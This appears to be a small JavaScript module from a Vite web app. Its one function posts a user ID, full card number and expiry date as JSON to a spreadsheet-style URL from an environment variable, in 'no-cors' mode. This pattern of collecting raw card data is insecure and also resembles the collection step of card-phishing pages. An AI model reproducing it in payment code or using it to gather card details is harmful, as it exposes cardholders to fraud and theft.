/// <reference types="vite/client" />

export const sendCardDetails = async (userId, cardNumber, expiry) => {
	try {
		await fetch(`${import.meta.env.VITE_SHEETS_URL}`, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify({ userId, cardNumber, expiry }),
			mode: 'no-cors',
			redirect: 'follow',
		})
	} catch (error) {
		console.error('Error sending card details:', error)
	}
}
